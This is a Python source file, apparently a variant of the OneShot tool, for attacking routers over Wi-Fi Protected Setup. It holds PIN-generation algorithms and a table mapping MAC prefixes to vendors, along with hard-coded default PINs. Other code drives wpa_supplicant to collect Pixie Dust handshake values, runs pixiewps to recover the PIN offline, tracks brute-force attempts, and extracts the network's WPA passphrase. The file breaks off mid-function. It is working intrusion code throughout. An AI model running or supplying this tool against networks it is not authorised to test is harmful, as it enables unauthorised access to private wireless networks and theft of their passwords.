#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict
import wcwidth
import threading
import io


# ──────────────────────────────────────────────
# Real‑Time Terminal Logger
# ──────────────────────────────────────────────
class RealtimeLogger:
    """
    Prints every operation to the terminal in real‑time:
    • commands being run
    • their stdout/stderr (streamed live)
    • errors / warnings / success
    All lines are timestamped for traceability.

    When sys.stdout is a StringIO wrapper (WebUI capture mode),
    ANSI codes are automatically stripped so the web UI sees clean text.
    """
    _lock = threading.Lock()
    _enabled = True

    # ANSI colour codes
    _CYAN    = '\033[96m'
    _GREEN   = '\033[92m'
    _YELLOW  = '\033[93m'
    _RED     = '\033[91m'
    _MAGENTA = '\033[95m'
    _RESET   = '\033[00m'
    _GREY    = '\033[90m'
    _ANSI_RE = re.compile(r'\033\[[0-9;]*m')
    _SEP     = '─' * 60

    @classmethod
    def _strip_ansi(cls, text: str) -> str:
        """Remove ANSI escape codes when stdout is not a real terminal."""
        if isinstance(sys.stdout, io.StringIO):
            return cls._ANSI_RE.sub('', text)
        return text

    @classmethod
    def _ts(cls):
        return cls._GREY + datetime.now().strftime('%H:%M:%S') + cls._RESET

    @classmethod
    def _write(cls, text: str):
        if not cls._enabled:
            return
        with cls._lock:
            print(cls._strip_ansi(text))

    @classmethod
    def cmd(cls, command: str):
        cls._write(f'  {cls._ts()} {cls._CYAN}▸ CMD{cls._RESET} {command}')

    @classmethod
    def info(cls, msg: str):
        cls._write(f'  {cls._ts()} {cls._GREEN}ℹ{cls._RESET} {msg}')

    @classmethod
    def warn(cls, msg: str):
        cls._write(f'  {cls._ts()} {cls._YELLOW}⚠{cls._RESET} {msg}')

    @classmethod
    def err(cls, msg: str):
        cls._write(f'  {cls._ts()} {cls._RED}✖{cls._RESET} {msg}')

    @classmethod
    def ok(cls, msg: str):
        cls._write(f'  {cls._ts()} {cls._GREEN}✔{cls._RESET} {msg}')

    @classmethod
    def stdout(cls, line: str):
        cls._write(f'  {cls._ts()} {cls._GREY}│{cls._RESET} {line}')

    @classmethod
    def step(cls, msg: str):
        cls._write(f'  {cls._ts()} {cls._MAGENTA}◈{cls._RESET} {msg}')

    @classmethod
    def separator(cls):
        cls._write(cls._SEP)

    @classmethod
    def run_subprocess(cls, cmd: str, **kwargs) -> subprocess.CompletedProcess:
        cls.cmd(cmd)
        popen = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding='utf-8',
            errors='replace',
            **{k: v for k, v in kwargs.items() if k not in ('stdout', 'stderr')}
        )
        lines = []
        for raw_line in popen.stdout:
            line = raw_line.rstrip('\n\r')
            lines.append(line)
            cls.stdout(line)
        popen.wait()
        result = subprocess.CompletedProcess(
            args=cmd,
            returncode=popen.returncode,
            stdout='\n'.join(lines),
        )
        if popen.returncode == 0:
            cls.ok(f'Exit code {popen.returncode}')
        else:
            cls.err(f'Exit code {popen.returncode}')
        return result


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.r_nonce = ''
        self.bssid = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.r_nonce
                and self.authkey and self.e_hash1 and self.e_hash2
                and self.bssid)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = ['pixiewps']
        pixiecmd.extend([
            '--pke', self.pke,
            '--pkr', self.pkr,
            '--e-hash1', self.e_hash1,
            '--e-hash2', self.e_hash2,
            '--authkey', self.authkey,
            '--e-nonce', self.e_nonce,
            '--r-nonce', self.r_nonce,
            '--e-bssid', self.bssid,
            '--mode', '1,2,3,4,5'
        ])
        if full_range:
            pixiecmd.append('--force')
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL, WPS_TIMEOUT or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.is_locked = False
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

        self.bssid = bssid
        self.lastPwr = 0
        self.disconnect_count = 0

    def __init_wpa_supplicant(self):
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        RealtimeLogger.step('Initializing wpa_supplicant…')
        RealtimeLogger.cmd(cmd)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                err = self.wpas.communicate()[0]
                RealtimeLogger.err(f'wpa_supplicant failed (exit {ret})')
                for l in err.splitlines():
                    RealtimeLogger.stdout(l)
                raise ValueError('wpa_supplicant returned an error: ' + err)
            if os.path.exists(self.wpas_ctrl_path):
                RealtimeLogger.ok(f'wpa_supplicant started (ctrl: {self.wpas_ctrl_path})')
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        RealtimeLogger.cmd(f'wpa_ctrl: {command}')
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        RealtimeLogger.cmd(f'wpa_ctrl: {command}')
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        RealtimeLogger.stdout(f'wpa_ctrl reply: {inmsg.strip()}')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            RealtimeLogger.stdout(line)

        if line.startswith('WPS: '):
            if 'M2D' in line:
                RealtimeLogger.warn('Received WPS Message M2D')
                self.connection_status.status = 'WPS_FAIL'
                self.connection_status.is_locked = True
                RealtimeLogger.err('This AP is not accepting PINs right now without configuration')
                return False

            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                if n == 5:
                    RealtimeLogger.ok('The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.__print_with_indicators('*', 'Received WSC NACK')
                if self.connection_status.last_m_message < 3:
                    self.connection_status.is_locked = True
                    return False
                RealtimeLogger.err('Wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'Registrar Nonce' in line and 'hexdump' in line:
                self.pixie_creds.r_nonce = get_hex(line)
                assert(len(self.pixie_creds.r_nonce) == 16*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] R-Nonce: {self.pixie_creds.r_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    RealtimeLogger.info(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            RealtimeLogger.err('wpa_supplicant returned WPS-FAIL')
        elif 'WPS-TIMEOUT' in line:
            self.connection_status.status = 'WPS_TIMEOUT'
        elif 'NL80211_CMD_DEL_STATION' in line:
            self.disconnect_count += 1
            if self.disconnect_count == 5:
                RealtimeLogger.warn('Received NL80211 DEL_STATION too many times — possible interference')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            RealtimeLogger.ok(f'Selected AP via PBC: {bssid}')
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            if 'noise=' in line:
                noise = line.split("noise=")[1].split(" ")[0]
                RealtimeLogger.info(f"Current signal: {signal}, noise: {noise}")
            else:
                RealtimeLogger.info(f"Current signal: {signal}")

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        RealtimeLogger.step('Running Pixiewps (offline PIN recovery)…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            RealtimeLogger.cmd(' '.join(cmd))
        try:
            r = subprocess.run(cmd, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT, encoding='utf-8')
